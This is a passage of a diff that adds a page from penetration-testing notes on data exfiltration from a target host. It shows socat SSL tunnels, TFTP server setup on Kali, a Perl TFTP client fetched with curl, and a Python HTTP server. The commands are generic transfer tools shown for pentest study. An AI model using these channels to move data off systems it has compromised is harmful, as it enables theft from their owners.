+<p>You’ll see all the results in a Kali file <code class="file docutils literal"><span class="pre">host-session_2015-06-27_114402.txt</span></code>. Binary files are most easily transferred individually or as part of a tar/zip archive.</p>
+</div>
+<div class="section" id="encrypted-socat-to-socat-traffic">
+<h4>8.3.2.5.4. Encrypted <strong class="program">socat</strong> to <strong class="program">socat</strong> traffic<a class="headerlink" href="#encrypted-socat-to-socat-traffic" title="Permalink to this headline">¶</a></h4>
+<p>Traffic can be encrypted following <a class="reference external" href="http://www.dest-unreach.org/socat/doc/socat-openssltunnel.html">Securing Traffic Between two Socat Instances Using SSL</a> when <strong class="program">socat</strong> is available on both hosts:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># on the server (add fork option if want multiple clients)</span>
+socat OPENSSL-LISTEN:4433,reuseaddr,cert<span class="o">=</span>server.pem,cafile<span class="o">=</span>client.crt STDIO
+<span class="c1"># on the client</span>
+socat STDIO OPENSSL-CONNECT:server.domain.org:4433,cert<span class="o">=</span>client.pem,cafile<span class="o">=</span>server.crt
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="exfiltration-via-conventional-services">
+<h2>8.3.3. Exfiltration via conventional services<a class="headerlink" href="#exfiltration-via-conventional-services" title="Permalink to this headline">¶</a></h2>
+<p>There are conventional services meant to transfer files: TFTP, FTP, HTTP/HTTPS, ,SSH, scp, SMB, NFS, … . We mention only a few of these below.</p>
+<div class="section" id="tftp">
+<h3>8.3.3.1. TFTP<a class="headerlink" href="#tftp" title="Permalink to this headline">¶</a></h3>
+<p>Kali currently has the <strong class="program">atftpd</strong> tftp server package installed by default (but not the <strong class="program">atftp</strong> client package). The challenge is getting a tftp client on the target host.</p>
+<p>Setup is quick:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
+<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
+<span class="nv">CONFIG</span><span class="o">=</span>/etc/default/atftpd
+<span class="nv">$SUDO</span> cp <span class="nv">$CONFIG</span> <span class="nv">$CONFIG</span>.orig
+cat <span class="s">&lt;&lt;EOF | $SUDO tee $CONFIG</span>
+<span class="s">USE_INETD=false</span>
+<span class="s">OPTIONS=&quot;--tftpd-timeout 300 --retry-timeout 5 --port 69 --maxthread 100 --verbose=5 /srv/tftp&quot;</span>
+<span class="s">EOF</span>
+<span class="c1"># Insure /srv/tftp exists with owner nobody.root and perms 755</span>
+<span class="nv">TFTPDIR</span><span class="o">=</span>/srv/tftp
+ls -ld <span class="nv">$TFTPDIR</span>
+<span class="nv">$SUDO</span> mkdir -p <span class="nv">$TFTPDIR</span>
+<span class="nv">$SUDO</span> chown nobody.root <span class="nv">$TFTPDIR</span>
+<span class="nv">$SUDO</span> chmod <span class="m">755</span> <span class="nv">$TFTPDIR</span>
+ls -ld <span class="nv">$TFTPDIR</span>
+</pre></div>
+</div>
+<p>If there’s no readily available client for the target host one can often find a client to download. For example, if perl is available on the client, the perl module <a class="reference external" href="https://github.com/gbarr/perl-net-tftp">gbarr/perl-net-tftp</a> (Net::TFTP) can be used. Here’s an example for Kali linux (assuming the tftp server is configured as above):</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span>mkdir -p Net
+<span class="nb">cd</span> Net
+curl --remote-name https://github.com/gbarr/perl-net-tftp/blob/master/TFTP.pm
+<span class="nb">cd</span> ..
+<span class="c1"># Start with &quot;hello.txt&quot;</span>
+<span class="nb">echo</span> hello &gt; hello.txt
+<span class="c1"># Put it to the tftp server as file &quot;hi.txt&quot;</span>
+perl -e <span class="s1">&#39;use Net::TFTP; $tftp = Net::TFTP-&gt;new(&quot;localhost&quot;); $tftp-&gt;binary; my $retval = $tftp-&gt;put(&quot;hello.txt&quot;, &quot;hi.txt&quot;)&#39;</span>
+<span class="c1"># Now fetch it from the tftp server as file &quot;hihi.txt&quot;</span>
+perl -e <span class="s1">&#39;use Net::TFTP; $tftp = Net::TFTP-&gt;new(&quot;localhost&quot;); my $retval = $tftp-&gt;get(&quot;hi.txt&quot;,&quot;hihi.txt&quot;);&#39;</span>
+<span class="c1"># Show it hasn&#39;t changed:</span>
+diff hello.txt hihi.txt
+</pre></div>
+</div>
+<p>Kali does not have a client installed nor will very few target hosts. However, you can use the perl Net::TFTP module from a small perl file to download/upload files.</p>
+</div>
+<div class="section" id="ftp">
+<h3>8.3.3.2. FTP<a class="headerlink" href="#ftp" title="Permalink to this headline">¶</a></h3>
+<p><a class="reference external" href="https://hackerkitty.wordpress.com/2014/10/24/install-ftp-server-on-kali-linux/">hackerkitty Install ftp server on Kali Linux</a> and <a class="reference external" href="http://www.gosecure.it/blog/art/93/note/install-ftp-server-on-kali-linux/">Go Secure! Install ftp server on Kali Linux</a> are good references.</p>
+</div>
+<div class="section" id="http-https">
+<h3>8.3.3.3. HTTP/HTTPS<a class="headerlink" href="#http-https" title="Permalink to this headline">¶</a></h3>
+<p>Python provides a simple HTTP server for GET and HEAD requests:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">DIRECTORY</span><span class="o">=</span>/var/www
+<span class="nv">PORT</span><span class="o">=</span><span class="m">8000</span>  <span class="c1"># the default</span>
+<span class="nb">cd</span> <span class="nv">$DIRECTORY</span>
+python -m SimpleHTTPServer <span class="nv">$PORT</span>
+</pre></div>
+</div>
+<p>This can be done on both the client and server to transfer files.</p>
+<p>There are many existing articles covering HTTP setup allowing both file upload and download. We mention here that setting up a primitive HTTPS server using <strong class="program">openssl</strong> is covered in <a class="reference internal" href="#bootstrapping-exfiltration"><span class="std std-ref">Bootstrapping exfiltration</span></a> below.</p>
+</div>
+<div class="section" id="ssh">
+<h3>8.3.3.4. SSH<a class="headerlink" href="#ssh" title="Permalink to this headline">¶</a></h3>
+<p>See <a class="reference external" href="http://pentestmonkey.net/cheat-sheet/ssh-cheat-sheet">SSH Cheat Sheet</a> for ideas about using <strong class="program">ssh</strong>.</p>
+</div>
+</div>
+</div>
+
+
+           </div>
+           <div class="articleComments">
+            
+           </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="exiftool.html" class="btn btn-neutral float-right" title="8.4. exiftool" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="email_security.html" class="btn btn-neutral" title="8.2. Email Security" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2017, bitbender.
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  
+
+    <script type="text/javascript">
+        var DOCUMENTATION_OPTIONS = {
+            URL_ROOT:'../',
+            VERSION:'1.0.2',
+            COLLAPSE_INDEX:false,
+            FILE_SUFFIX:'.html',
+            HAS_SOURCE:  true,
+            SOURCELINK_SUFFIX: '.txt'
+        };
+    </script>
+      <script type="text/javascript" src="../_static/jquery.js"></script>
+      <script type="text/javascript" src="../_static/underscore.js"></script>
+      <script type="text/javascript" src="../_static/doctools.js"></script>
+      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+  
+
+  
+  
+    <script type="text/javascript" src="../_static/js/theme.js"></script>
+  
+
+  
+  
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.StickyNav.enable();
+      });
+  </script>
+   
+
+</body>
+</html>
